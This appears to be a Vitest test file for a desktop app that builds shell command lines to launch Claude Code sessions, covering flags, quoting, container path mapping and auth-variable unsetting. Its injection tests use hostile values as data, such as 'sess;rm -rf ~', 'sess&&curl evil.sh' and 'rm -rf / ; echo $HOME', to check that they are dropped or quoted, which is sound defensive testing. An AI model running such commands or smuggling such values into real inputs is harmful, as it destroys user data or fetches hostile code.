// @vitest-environment node
import { describe, expect, it } from 'vitest';

import { createPathMap } from '../../../../../electron/main/container/path-map';
import { claudeCodeAdapter } from '../../../../../electron/main/harness/claude-code';
import { sessionCommand } from '../../../../../electron/main/harness/claude-code/launch';
import type { LaunchSpec } from '../../../../../electron/main/harness/port';
import { AUTH_ENV_KEYS } from '../../../../../electron/shared/config-contract';

/**
 * The command line is byte-identical to the one `sessionCommand` built at
 * `c67028ab`, before it moved behind the port (HIVE-234). The expectations
 * are literals captured from that commit, not recomputed.
 */
describe('claudeCodeAdapter.launch equals the pre-port command line (HIVE-234)', () => {
  const UUID = '00000000-0000-4000-8000-000000000000';
  const USER = '/Users/dev/Library/Application Support/HiveTTY';
  const map = createPathMap({ projectPath: '/Users/dev/p', userDataPath: USER, workspace: '/workspace', hiveDir: '/hive' });
  const config = { workspace: '/workspace', hiveDir: '/hive', envArg: '-e {name}={value}', freshness: 'exec-env' as const, hostAlias: 'host.docker.internal' };
  const container = { config, map, env: { FOO: 'bar', HIVE_SESSION_ID: 'sess-01' } };
  const paths = { settingsPath: `${USER}/hive/settings.json`, pluginDir: `${USER}/hive/plugin`, mcpConfig: `${USER}/hive/mcp.json` };
  const HOST_FLAGS = "--settings '/Users/dev/Library/Application Support/HiveTTY/hive/settings.json' --plugin-dir '/Users/dev/Library/Application Support/HiveTTY/hive/plugin' --mcp-config '/Users/dev/Library/Application Support/HiveTTY/hive/mcp.json'";
  const BOX_FLAGS = "--settings '/hive/settings.json' --plugin-dir '/hive/plugin' --mcp-config '/hive/mcp.json'";
  const UNSET = 'unset ANTHROPIC_API_KEY ANTHROPIC_AUTH_TOKEN; ';

  const rows: [string, LaunchSpec, string][] = [
    ['host, bare', { command: 'claude' }, 'claude && exit'],
    [
      'host, every flag, subscription on',
      { command: 'claude', model: 'opus', effort: 'high', name: 'sess-01', sessionUuid: UUID, ...paths, subscriptionAuth: true, task: "don't\nbreak it" },
      `${UNSET}claude --model opus --effort high --name sess-01 --session-id ${UUID} ${HOST_FLAGS} -- 'don'\\''t break it' && exit`,
    ],
    [
      'host, subscription off, unnamed, with task',
      { command: 'claude', sessionUuid: UUID, ...paths, subscriptionAuth: false, task: 'fix the build' },
      `claude --session-id ${UUID} ${HOST_FLAGS} -- 'fix the build' && exit`,
    ],
    [
      'host, resume',
      { command: 'claude', name: 'sess-01', sessionUuid: UUID, resume: true, ...paths, subscriptionAuth: true },
      `${UNSET}claude --name sess-01 --resume ${UUID} ${HOST_FLAGS} && exit`,
    ],
    [
      'host, unsendable name, blank task',
      { command: 'claude', name: 'bad name;', sessionUuid: UUID, task: '   ' },
      `claude --session-id ${UUID} && exit`,
    ],
    [
      'container with {env}',
      { command: 'docker exec -it {env} box claude', sessionUuid: UUID, ...paths, subscriptionAuth: true, task: 'hi {env}', container },
      `${UNSET}docker exec -it -e FOO='bar' -e HIVE_SESSION_ID='sess-01' box claude --session-id ${UUID} ${BOX_FLAGS} -- 'hi {env}' && exit`,
    ],
    [
      'container without {env}',
      { command: 'docker exec -it box claude', sessionUuid: UUID, ...paths, container },
      `docker exec -it box claude --session-id ${UUID} ${BOX_FLAGS} && exit`,
    ],
    [
      'container, resume',
      { command: 'docker exec -it {env} box claude', name: 'sess-01', sessionUuid: UUID, resume: true, ...paths, container },
      `docker exec -it -e FOO='bar' -e HIVE_SESSION_ID='sess-01' box claude --name sess-01 --resume ${UUID} ${BOX_FLAGS} && exit`,
    ],
  ];

  it.each(rows)('%s', (_, spec, expected) => {
    const plan = claudeCodeAdapter.launch(spec);
    expect(plan.command).toBe(expected);
    expect(plan.stripEnv).toEqual(spec.subscriptionAuth === true ? AUTH_ENV_KEYS : []);
    expect(plan.submitDelayMs).toBe(300);
  });
});

describe('sessionCommand identity flags (HIVE-61)', () => {
  const UUID = '00000000-0000-4000-8000-000000000000';

  it('names the session and pins its id', () => {
    expect(sessionCommand('claude', { name: 'sess-01', sessionUuid: UUID })).toBe(
      `claude --name sess-01 --session-id ${UUID} && exit`,
    );
  });

  it('resumes the conversation the uuid names when asked (HIVE-88)', () => {
    // Same identifier, opposite claim: continue it rather than start it.
    expect(
      sessionCommand('claude', { name: 'sess-01', sessionUuid: UUID, resume: true }),
    ).toBe(`claude --name sess-01 --resume ${UUID} && exit`);
  });

  it('has nothing to resume without a uuid', () => {
    // A record written before uuids were kept gets the plain spawn.
    expect(sessionCommand('claude', { name: 'sess-01', resume: true })).toBe(
      'claude --name sess-01 && exit',
    );
  });

  it('quotes the settings path, which contains a space on every Mac', () => {
    /**
     * `app.getPath('userData')` is `~/Library/Application Support/the-hive/…`.
     * Unquoted, the shell split it and `claude` got `--settings
     * /Users/…/Application` plus a stray positional argument it read as an
     * initial prompt — so hook status never worked on macOS at all.
     */
    expect(
      sessionCommand('claude', {
        settingsPath: '/Users/x/Library/Application Support/the-hive/hooks.json',
      }),
    ).toBe(
      "claude --settings '/Users/x/Library/Application Support/the-hive/hooks.json' && exit",
    );
  });

  it('escapes a single quote in the settings path', () => {
    // A home directory can contain one; `'\''` closes, escapes and reopens.
    expect(sessionCommand('claude', { settingsPath: "/Users/o'brien/hooks.json" })).toBe(
      "claude --settings '/Users/o'\\''brien/hooks.json' && exit",
    );
  });

  it('omits --plugin-dir when there is no generated directory', () => {
    /*
      `pluginDirPath()` answers null until a sync has succeeded (HIVE-96). A
      session with no custom skills is the correct outcome of that — better than
      one pointed at a directory that is not there.
    */
    expect(sessionCommand('claude', {})).toBe('claude && exit');
  });

  it('quotes the plugin dir, which is under Application Support too', () => {
    expect(
      sessionCommand('claude', {
        pluginDir: '/Users/x/Library/Application Support/the-hive/hive/plugin',
      }),
    ).toBe(
      "claude --plugin-dir '/Users/x/Library/Application Support/the-hive/hive/plugin' && exit",
    );
  });

  it('emits --plugin-dir exactly once, after --settings', () => {
    const command = sessionCommand('claude', {
      settingsPath: '/s/hooks.json',
      pluginDir: '/p/plugin',
    });

    expect(command).toBe(
      "claude --settings '/s/hooks.json' --plugin-dir '/p/plugin' && exit",
    );
    expect(command.match(/--plugin-dir/g)).toHaveLength(1);
  });

  it('keeps the flags in a stable order alongside model and effort', () => {
    expect(
      sessionCommand('claude', {
        model: 'opus',
        effort: 'high',
        name: 'sess-01',
        sessionUuid: UUID,
      }),
    ).toBe(`claude --model opus --effort high --name sess-01 --session-id ${UUID} && exit`);
  });

  it.each([
    ['a space', 'sess 01'],
    ['a semicolon', 'sess;rm -rf ~'],
    ['a backtick', 'sess`whoami`'],
    ['a dollar', 'sess$HOME'],
    ['an ampersand', 'sess&&curl evil.sh'],
    ['a quote', "sess'x"],
    ['a double quote', 'sess"x'],
    ['a pipe', 'sess|sh'],
    ['a newline', 'sess\nrm -rf ~'],
    ['a backslash', 'sess\\x'],
    ['an empty string', ''],
  ])('drops a name containing %s rather than escaping it', (_label, name) => {
    /**
     * The security property. `--name` is interpolated into a string a login
     * shell parses, and unlike `--model`/`--effort` it has no closed list behind
     * it — so the reasoning that justifies leaving those unquoted does not reach
     * this one. A name that fails the pattern omits the **flag**, which starts
     * the session unnamed: exactly what it did before this story, and never a
     * command line with a shell metacharacter in it.
     */
    const command = sessionCommand('claude', { name });

    expect(command).toBe('claude && exit');
    expect(command).not.toContain('--name');
  });

  it('drops a name past the length cap', () => {
    expect(sessionCommand('claude', { name: 'a'.repeat(65) })).toBe('claude && exit');
  });

  it('accepts the ids the app actually generates', () => {
    // `sess-01`, and the fixture ids that reach this path on first open.
    for (const name of ['sess-01', 'sess-a1', 'hero-refresh', 'lead-form']) {
      expect(sessionCommand('claude', { name })).toBe(`claude --name ${name} && exit`);
    }
  });

  it('accepts a ticket key and its de-duplicating suffix (HIVE-78)', () => {
    /**
     * The Work-tab path. A session started from a ticket card is called after
     * its issue rather than `sess-07`, so the agent's own prompt box, its
     * `/resume` entry and the fleet rail all say the same thing.
     *
     * A Jira key is uppercase, digits and hyphens, and the suffix adds a hyphen
     * and digits — so it satisfies `SESSION_NAME_PATTERN` by construction and
     * reaches the command line rather than being silently dropped.
     */
    for (const name of ['HIVE-73', 'HIVE-73-2', 'INCORP-332', 'H2-1']) {
      expect(sessionCommand('claude', { name })).toBe(`claude --name ${name} && exit`);
    }
  });

  it('drops a session id that is not a uuid', () => {
    /**
     * A malformed value makes `claude` exit non-zero, and `&&` turns that into
     * "the session opened and did nothing" — the hardest failure to diagnose
     * from the outside.
     */
    expect(sessionCommand('claude', { sessionUuid: 'not-a-uuid' })).toBe(
      'claude && exit',
    );
  });
});

describe('sessionCommand', () => {
  it('exits the shell after a clean claude exit', () => {
    /**
     * The whole of "`/exit` retires the session": the login shell goes with the
     * agent, the pty exits, and story 096's existing `exit → done` mapping does
     * the rest. No new status, no process-tree watching.
     */
    expect(sessionCommand('claude')).toBe('claude && exit');
  });

  it('wraps whatever claudeCommand is configured, not a hard-coded binary', () => {
    // Story 090 lets a user point at a wrapper or an alternate build; the exit
    // behaviour has to follow it rather than only applying to the default.
    expect(sessionCommand('/opt/bin/claude --verbose')).toBe(
      '/opt/bin/claude --verbose && exit',
    );
  });

  it('is `&&`, so a failed start leaves the shell alive to show the error', () => {
    /**
     * Asserted as the operator rather than as behaviour, because the behaviour
     * is the shell's. `;` here would make a mistyped `claudeCommand` close every
     * new session instantly, with `command not found` scrolling past inside a
     * pty that is already going away — the single worst failure this could have.
     */
    expect(sessionCommand('claude')).not.toContain(';');
    expect(sessionCommand('claude')).toContain('&&');
  });

  describe('the picker’s choice reaches the command line (story 109)', () => {
    it('appends both flags, before the `&&`', () => {
      /**
       * The defect: model and effort were recorded on the entity and rendered
       * on its chip from the story that introduced the picker, and reached the
       * process in no story at all. A session started as Haiku with low effort
       * opened as Opus and its own meta bar agreed.
       *
       * Position matters — they are arguments to `claude`, so binding them to
       * `exit` instead would both lose them and break the short-circuit.
       */
      expect(sessionCommand('claude', { model: 'haiku', effort: 'low' })).toBe(
        'claude --model haiku --effort low && exit',
      );
    });

    it('omits the flag it was not given, rather than inventing a default', () => {
      /**
       * A default here would silently override the user's own `claude`
       * configuration for every session nobody picked a model for.
       */
      expect(sessionCommand('claude', { model: 'opus' })).toBe(
        'claude --model opus && exit',
      );
      expect(sessionCommand('claude', { effort: 'max' })).toBe(
        'claude --effort max && exit',
      );
      expect(sessionCommand('claude', {})).toBe('claude && exit');
    });

    it('appends to a wrapper command, which is the real configuration', () => {
      /**
       * `claudeCommand` is routinely a shell function or script that forwards
       * its arguments — the flags have to land after it, not inside it.
       */
      expect(sessionCommand('clauded', { model: 'sonnet', effort: 'high' })).toBe(
        'clauded --model sonnet --effort high && exit',
      );
    });
  });

  describe('the task becomes the initial prompt (HIVE-91)', () => {
    it('passes the task as a positional argument, after the flags', () => {
      /**
       * Position is the assertion. Before the `&&` so it binds to `claude` and
       * not to `exit`, and after the flags so it is read as the prompt rather
       * than as a value for whichever flag it happened to follow.
       */
      expect(
        sessionCommand('claude', { model: 'opus', task: 'fix the hero' }),
      ).toBe("claude --model opus -- 'fix the hero' && exit");
    });

    it('quotes it, because it is the one value with no closed list behind it', () => {
      /**
       * `--model`/`--effort`/`--name` are validated against closed lists, so the
       * module's no-quoting rule covers them. The task is free text from the
       * console and the picker, so it is the second argument here — after
       * `settingsPath` — that genuinely needs quoting.
       */
      expect(sessionCommand('claude', { task: 'rm -rf / ; echo $HOME' })).toBe(
        "claude -- 'rm -rf / ; echo $HOME' && exit",
      );
    });

    it('survives a task containing a single quote', () => {
      // `'\''` closes, escapes and reopens — the same mechanism `settingsPath`
      // relies on for `/Users/o'brien/…`.
      expect(sessionCommand('claude', { task: "don't break" })).toBe(
        "claude -- 'don'\\''t break' && exit",
      );
    });

    it('omits an empty task rather than passing an empty argument', () => {
      /**
       * The picker spawns with `''`, not `undefined`, so this is the common path.
       * `claude ''` is a request to open with a blank prompt, which is not the
       * same as opening with none.
       */
      expect(sessionCommand('claude', { task: '' })).toBe('claude && exit');
      expect(sessionCommand('claude', { task: '   ' })).toBe('claude && exit');
      expect(sessionCommand('claude', {})).toBe('claude && exit');
    });

    it('flattens newlines, which would submit the line early', () => {
      /**
       * The command is written into a pty and terminated by one `\r`. An embedded
       * newline would submit at that point and leave the tail of the task — and
       * the `&& exit` — to be read by the shell as a second command line.
       */
      expect(
        sessionCommand('claude', { task: 'first line\nsecond line' }),
      ).toBe("claude -- 'first line second line' && exit");
      expect(sessionCommand('claude', { task: 'trailing\r\n' })).toBe(
        "claude -- 'trailing' && exit",
      );
    });

    it('rides alongside every other flag, in a full spawn', () => {
      /**
       * The shape main actually builds, so the ordering is pinned. The `--` is
       * load-bearing: `--mcp-config <configs...>` is variadic, and without it
       * `claude` read the task as a second config file and refused to start.
       */
      expect(
        sessionCommand('claude', {
          model: 'sonnet',
          effort: 'high',
          name: 'INCORP-455',
          settingsPath: '/Users/x/Application Support/hooks.json',
          pluginDir: '/Users/x/Application Support/hive/plugin',
          mcpConfig: '/Users/x/Application Support/hive/mcp.json',
          task: '/hive:work-on GRAC-1777',
          subscriptionAuth: true,
        }),
      ).toBe(
        'unset ANTHROPIC_API_KEY ANTHROPIC_AUTH_TOKEN; ' +
          'claude --model sonnet --effort high --name INCORP-455 ' +
          "--settings '/Users/x/Application Support/hooks.json' " +
          "--plugin-dir '/Users/x/Application Support/hive/plugin' " +
          "--mcp-config '/Users/x/Application Support/hive/mcp.json' " +
          "-- '/hive:work-on GRAC-1777' && exit",
      );
    });
  });

  describe('sessionCommand — the MCP config (HIVE-112)', () => {
    it('passes --mcp-config when one is offered', () => {
      const command = sessionCommand('claude', { mcpConfig: '/userData/hive/hive.mcp.json' });

      expect(command).toContain("--mcp-config '/userData/hive/hive.mcp.json'");
    });

    it('omits the flag when there is none', () => {
      expect(sessionCommand('claude', {})).not.toContain('--mcp-config');
    });

    it('quotes a path with a space, like userData always has', () => {
      const command = sessionCommand('claude', {
        mcpConfig: '/Users/x/Application Support/Hive/hive.mcp.json',
      });

      expect(command).toContain("'/Users/x/Application Support/Hive/hive.mcp.json'");
    });

    it('does not pass --strict-mcp-config — a session keeps its own servers', () => {
      // Verified against the real CLI: without --strict, --mcp-config merges.
      // With it, the user's own MCP servers would vanish inside the Hive.
      const command = sessionCommand('claude', { mcpConfig: '/a/b.json' });

      expect(command).not.toContain('--strict-mcp-config');
    });

    it('sits alongside --plugin-dir rather than replacing it', () => {
      const command = sessionCommand('claude', {
        pluginDir: '/userData/hive/plugin',
        mcpConfig: '/userData/hive/hive.mcp.json',
      });

      expect(command).toContain('--plugin-dir');
      expect(command).toContain('--mcp-config');
    });
  });
});

describe('sessionCommand container projects', () => {
  const config = {
    workspace: '/workspace',
    hiveDir: '/hive',
    envArg: '-e {name}={value}',
    freshness: 'exec-env' as const,
    hostAlias: 'host.docker.internal',
  };

  const map = createPathMap({
    projectPath: '/Users/dev/Projects/the-hive',
    userDataPath: '/Users/dev/Library/Application Support/The Hive',
    workspace: '/workspace',
    hiveDir: '/hive',
  });

  const container = {
    config,
    map,
    env: { FOO: 'bar', HIVE_SESSION_ID: 'hero-refresh', HIVE_HOOK_TOKEN: 'a3f' },
  };

  const paths = {
    settingsPath:
      '/Users/dev/Library/Application Support/The Hive/hive/container/claude-hooks.settings.json',
    mcpConfig:
      '/Users/dev/Library/Application Support/The Hive/hive/container/hive.mcp.json',
    pluginDir: '/Users/dev/Library/Application Support/The Hive/hive/plugin',
  };

  it('expands the environment at the placeholder and rewrites every path', () => {
    const command = sessionCommand('docker exec -it {env} devbox claude', {
      ...paths,
      container,
    });

    expect(command).toContain(
      "-e FOO='bar' -e HIVE_SESSION_ID='hero-refresh' -e HIVE_HOOK_TOKEN='a3f' devbox claude",
    );
    expect(command).toContain(
      "--settings '/hive/container/claude-hooks.settings.json'",
    );
    expect(command).toContain("--mcp-config '/hive/container/hive.mcp.json'");
    expect(command).toContain("--plugin-dir '/hive/plugin'");
    // No host path survives into the container's argv.
    expect(command).not.toContain('Application Support');
  });

  it('maps a nested per-session settings path the same way (freshness is not read here)', () => {
    // `sessionCommand` never branches on `freshness` — that only decides, one
    // layer up, which host path `settingsPath` is in the first place. This
    // exercises a deeper, per-session path shape through the same `mapped()`
    // logic the first test already covers for a flat one.
    const command = sessionCommand('docker exec -it {env} devbox claude', {
      settingsPath:
        '/Users/dev/Library/Application Support/The Hive/hive/container/sessions/hero-refresh/claude-hooks.settings.json',
      container: { ...container, config: { ...config, freshness: 'rewrite' } },
    });

    expect(command).toContain(
      "--settings '/hive/container/sessions/hero-refresh/claude-hooks.settings.json'",
    );
  });

  it('drops an unmappable flag without dropping its neighbours', () => {
    /**
     * The property most likely to leak a host path into a container's argv if
     * `mapped()` ever regresses: `/etc/hive/x.json` is under neither
     * `projectPath` nor `<userData>/hive`, so `toContainer` returns `null` and
     * the flag must vanish — not survive as the host path, and not survive as
     * an empty-quoted argument. The other two flags, which *are* mappable,
     * must still come through untouched.
     */
    const command = sessionCommand('docker exec -it {env} devbox claude', {
      settingsPath: '/etc/hive/x.json',
      mcpConfig: paths.mcpConfig,
      pluginDir: paths.pluginDir,
      container,
    });

    expect(command).not.toContain('--settings');
    expect(command).not.toContain('/etc/hive/x.json');
    expect(command).not.toContain("--settings ''");
    expect(command).toContain("--mcp-config '/hive/container/hive.mcp.json'");
    expect(command).toContain("--plugin-dir '/hive/plugin'");
  });

  it('leaves the command alone when it has no placeholder', () => {
    // Task 9's diagnostic is what refuses this; a half-built command is worse.
    // Pinned with `toBe` rather than `toContain`: dropping the `?? line`
    // fallback and leaking `substituteEnv`'s `null` in would still satisfy
    // both a `toContain('docker exec -it devbox claude')` and a
    // `not.toContain('-e HIVE_SESSION_ID')` on a longer, broken string.
    const command = sessionCommand('docker exec -it devbox claude', {
      ...paths,
      container,
    });
    expect(command).toBe(
      "docker exec -it devbox claude --settings '/hive/container/claude-hooks.settings.json' --plugin-dir '/hive/plugin' --mcp-config '/hive/container/hive.mcp.json' && exit",
    );
  });

  /**
   * The bug a final-review pass caught (HIVE-133, final-review fix,
   * Critical 1): `substituteEnv` used to run against the *joined* line — every
   * flag and the quoted task together — rather than against `claudeCommand`
   * alone. A task containing the literal text `{env}` (nothing stops a user
   * typing that) was then substituted a **second** time, inside its own
   * quoted region: each expansion is `-e NAME='value'`, an even number of
   * quotes, spliced into an already-open single-quoted string. The first `'`
   * in the splice closes the task's quote early, and everything after it —
   * a `;`, a backtick, a `$(…)` a project's `env` value happened to contain —
   * would land unquoted in the host login shell.
   *
   * This pins the fix two ways: the task survives quoted and intact, and
   * there is exactly one expansion — the one `claudeCommand` asked for, not a
   * second one inside the task.
   */
  it('does not substitute {env} written inside the task, only in claudeCommand', () => {
    const command = sessionCommand('docker exec -it {env} devbox claude', {
      ...paths,
      container,
      task: 'what does {env} do',
    });

    expect(command).toContain("'what does {env} do'");
    expect(command.match(/-e FOO=/g)).toHaveLength(1);
  });

  /**
   * The quieter half of the same bug: with the substitution run against the
   * joined line, a `claudeCommand` with **no** `{env}` but a task that happens
   * to contain the literal text made `substituteEnv` find *a* placeholder
   * anyway — in the task — and return non-null, so the container got none of
   * `HIVE_SESSION_ID`, `HIVE_HOOK_TOKEN` or `HIVE_RECEIVER_URL` while
   * `diagnoseCommand` correctly reported `missingEnvPlaceholder: true`. The
   * fix means `null` answers "no `{env}` in `claudeCommand`", full stop — so
   * this must behave exactly like "leaves the command alone when it has no
   * placeholder" above: nothing substituted, the task's literal text intact.
   */
  it('treats a task containing {env} as the no-placeholder case when claudeCommand has none', () => {
    const command = sessionCommand('docker exec -it devbox claude', {
      ...paths,
      container,
      task: 'what does {env} do',
    });

    expect(command).toContain("'what does {env} do'");
    expect(command).not.toContain('-e FOO=');
  });

  it('is byte-identical to today for a project with no container block', () => {
    const before = sessionCommand('claude', {
      settingsPath: '/Users/dev/Library/Application Support/The Hive/hive/x.json',
    });
    expect(before).toBe(
      "claude --settings '/Users/dev/Library/Application Support/The Hive/hive/x.json' && exit",
    );
  });
});
